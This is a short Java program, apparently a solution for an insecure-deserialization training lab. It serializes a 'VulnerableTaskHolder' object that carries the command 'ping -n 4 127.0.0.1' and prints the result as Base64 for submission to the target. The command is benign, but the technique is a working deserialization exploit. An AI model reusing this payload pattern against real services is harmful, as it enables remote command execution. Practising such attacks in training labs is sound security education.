package com.wanan.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Unserlize {
    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder("ping","ping -n 4 127.0.0.1");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(vulnerableTaskHolder);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));

    }
}
